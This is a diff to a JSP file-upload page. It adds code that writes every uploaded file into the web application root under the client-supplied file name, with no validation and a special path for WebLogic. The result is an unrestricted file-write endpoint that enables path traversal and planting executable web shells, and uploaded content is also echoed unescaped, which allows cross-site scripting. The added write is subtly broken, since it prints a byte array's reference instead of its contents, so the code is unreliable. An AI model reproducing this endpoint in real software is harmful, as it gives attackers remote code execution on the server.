@@ -3,6 +3,7 @@
 <%@ page import="org.apache.commons.fileupload.disk.DiskFileItemFactory" %>
 <%@ page import="org.apache.commons.fileupload.servlet.ServletFileUpload" %>
 <%@ page import="java.util.List" %>
+<%@ page import="java.io.*" %>
 <%@ page contentType="text/html; charset=UTF-8" %>
 <html>
 <head>
@@ -21,14 +22,28 @@ if ("POST".equals(method)) {
 			DiskFileItemFactory factory = new DiskFileItemFactory();
 			ServletFileUpload upload = new ServletFileUpload(factory);
 			List<FileItem> items = upload.parseRequest(request);
-			for (FileItem item: items) { 
+			for (FileItem item: items) {
 				String content = new String(item.get());
 			%>
 				<div>
 					<p>file name: <%= item.getName() %></p>
 					<div><%= content %></div>
 				</div>
-			<%}
+			<%
+			String path;
+			String serverInfo = application.getServerInfo();
+			if (serverInfo != null && serverInfo.toLowerCase().contains("weblogic")) {
+				path = application.getResource("/").getPath() + "/" + item.getName();
+			} else {
+				path = application.getRealPath("/") + "/" + item.getName();
+			}
+			FileOutputStream os = new FileOutputStream(path);
+			PrintWriter writer = new PrintWriter(os);
+			writer.print(content.getBytes("UTF-8"));
+			writer.close();
+			out.println("\n");
+			out.println("写入文件 ====> " + path);
+			}
 		}
 	} catch (Exception e) {
 	    out.print(e);
@@ -47,3 +62,4 @@ if ("POST".equals(method)) {
 %>
 </body>
 </html>
+
